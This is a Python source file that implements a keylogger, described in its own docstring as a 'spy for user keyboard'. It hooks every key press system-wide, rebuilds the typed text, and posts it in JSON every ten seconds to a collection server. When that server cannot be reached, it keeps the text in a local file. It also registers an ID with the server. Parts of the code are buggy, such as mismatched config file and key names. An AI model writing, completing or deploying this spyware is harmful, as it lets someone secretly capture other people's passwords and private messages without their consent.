import keyboard
import time
from datetime import datetime
from threading import Thread
import json
import requests
import os
import configparser


class KeyLogger():
    '''spy for user keyboard'''
    def __init__(self, filename, url):
        self.__log = []
        self.__keylogger_result = ''
        self.__file = filename
        self.__url = url
        self.__id = 0

    def __log_pressed_keys(self, key):
        '''send data to log'''
        self.__log.append(key.name)

    def __listening_loop(self):
        '''listen key down'''
        keyboard.on_press(self.__log_pressed_keys)
        keyboard.wait()

    def __parse_log_loop(self):
        '''parse data from raw log, deleting special keys'''
        while True:
            black_list = ['shift', 'ctrl', 'alt', 'right', 'left', 'up', 'down'] # deleteing special keys
            copy_log = self.__log.copy()
            self.__log = []
            for i in copy_log:
                if i == 'space':
                    self.__keylogger_result += ' '
                elif i == 'enter':
                    self.__keylogger_result += '\n'
                elif i == 'backspace':
                    self.__keylogger_result += '~'
                elif not i in black_list:
                    self.__keylogger_result += i
            time.sleep(1)

    @staticmethod
    def __read_data_from_file(file):
        with open(file, 'r') as file:
            to_ret = file.read()
        return to_ret

    def __create_json_dict(self, data):
        '''create json dict with now date and some data'''
        now = datetime.strftime(datetime.now(), '%Y-%m-%d %H:%M:%S')
        return json.dumps({'data': data, 'keylogger_ref': self.__id, 'date':now})

    @staticmethod
    def __write_to_file(data, file):
        '''write data from result to file'''
        with open(file, 'a') as f:
            f.write(data)

    def __send_to_server(self, data):
        '''send data in json format to server'''
        requests.post(self.__url, {self.__id:self.__create_json_dict(data)})

    def __restore_data(self):
        '''restore data from file'''
        try:
            return self.__read_data_from_file(self.__file)
        except FileNotFoundError:
            return ''

    def __save_data(self):
        '''send data to sever, or saving it in file'''
        self.__keylogger_result = self.__restore_data()
        no_Internet = False
        while True:
            try:
                if no_Internet:
                    self.__send_to_server(self.__keylogger_result+self.__restore_data())
                    no_Internet = False
                    os.remove(self.__file)
                else:
                    self.__send_to_server(self.__keylogger_result)
            except:
                no_Internet = True
                self.__write_to_file(self.__keylogger_result, self.__file)
            finally:
                self.__keylogger_result = ''
            time.sleep(10)

    def __get_id(self):
        id = json.loads(requests.get(self.__url+'/create-keylogger'))['id']
        conf = configparser.ConfigParser()
        conf['MIAN']['id'] = id
        with open('config.ini', 'w') as file:
            conf.write(file)
        return id
        
    def __restore_id(self):
        conf = configparser.ConfigParser()
        conf.read('conf.ini')
        return conf['MAIN']['id']

    def __inital_doing(self):
        if os.path.exists('config.ini'):
            self.__id = self.__restore_id()
        else:
            self.__id = self.__get_id()
    def mainloop(self):
        '''divide kelogger's logic to treads'''
        self.__inital_doing()
        log_thread = Thread(target=self.__listening_loop, name='log')
        parse_log_tread = Thread(target=self.__parse_log_loop, name='parse')
        save_tread = Thread(target=self.__save_data, name='save')
        log_thread.start()
        parse_log_tread.start()
        save_tread.start()

        
if __name__ == "__main__":
    keylogger = KeyLogger('log.data', 'http://127.0.0.1:8000')
    keylogger.mainloop()
